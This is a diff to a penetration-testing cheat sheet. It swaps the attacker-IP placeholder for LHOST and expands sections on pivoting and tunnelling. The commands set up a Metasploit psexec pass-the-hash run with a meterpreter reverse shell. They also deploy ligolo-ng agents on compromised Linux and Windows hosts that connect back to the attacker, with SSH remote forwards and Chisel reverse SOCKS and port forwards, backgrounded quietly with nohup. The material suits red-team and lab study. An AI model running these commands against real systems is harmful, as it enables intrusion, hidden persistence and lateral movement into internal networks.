@@ -153,7 +153,7 @@ set SMBUser <USERNAME>
 set SMBPass <PASSWORD>
 set SMBDomain <DOMAIN>
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <ATTACKER_IP>
+set LHOST <LHOST>
 exploit
 
 # PSExec with Pass-the-Hash
@@ -1892,12 +1892,12 @@ sudo ./proxy -laddr 0.0.0.0:11601 -selfcert
 
 # Compromised host: deploy agent
 chmod +x agent
-./agent -connect <ATTACKER_IP>:11601 -ignore-cert
-nohup ./agent -connect <ATTACKER_IP>:11601 -ignore-cert &>/dev/null &   # background
+./agent -connect <LHOST>:11601 -ignore-cert
+nohup ./agent -connect <LHOST>:11601 -ignore-cert &>/dev/null &   # background
 
 # Windows agent
-.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
-Start-Process -NoNewWindow -FilePath ".\\agent.exe" -ArgumentList "-connect <ATTACKER_IP>:11601 -ignore-cert"
+.\agent.exe -connect <LHOST>:11601 -ignore-cert
+Start-Process -NoNewWindow -FilePath ".\\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert"
 ```
 
 **Activate & Route**
@@ -1943,7 +1943,7 @@ sudo ip route add 10.10.10.0/24 dev ligolo
 
 # 2) Land on Host B through Host A
 nmap -sT -Pn 10.10.10.15
-./agent -connect <ATTACKER_IP>:11601 -ignore-cert   # run on Host B
+./agent -connect <LHOST>:11601 -ignore-cert   # run on Host B
 
 # 3) Switch to second session in proxy
 ligolo-ng » session 1
@@ -1966,20 +1966,31 @@ ssh -L 8080:10.10.10.5:80 user@pivot_host
 ssh -D 1080 user@pivot_host
 
 # Remote port forward (reverse from compromised host)
-ssh -R 8080:localhost:80 attacker@<ATTACKER_IP>
+ssh -R 8080:localhost:80 attacker@<LHOST>
 ```
 
 **Chisel Reverse SOCKS/Port Forward**
 
 ```bash
-# Attacker
-chisel server -p 8000 --reverse
+# ATTACKER (Server)
+# Start server allowing reverse tunnels
+./chisel server -p 8000 --reverse
 
-# Target -> reverse SOCKS
-chisel client <ATTACKER_IP>:8000 R:socks
+# TARGET (Reverse SOCKS5)
+# Dynamic SOCKS5 proxy on Attacker port 1080
+./chisel client <LHOST>:8000 R:socks &
 
-# Target -> reverse port forward
-chisel client <ATTACKER_IP>:8000 R:8080:10.10.10.5:80
+# TARGET (Reverse Port Forward - Localhost)
+# Maps Target's MySQL (3306) to Attacker port 3306
+./chisel client <LHOST>:8000 R:3306:127.0.0.1:3306 &
+
+# TARGET (Reverse Port Forward - Internal Pivot)
+# Maps 10.10.10.5:80 to Attacker port 8080
+./chisel client <LHOST>:8000 R:8080:10.10.10.5:80 &
+
+# TARGET (Self-Destruct / Background)
+# Run quietly in background and ignore HUP signals
+nohup ./chisel client <LHOST>:8000 R:socks > /dev/null 2>&1 &
 ```
 
 ### 6.6 Quick Reference
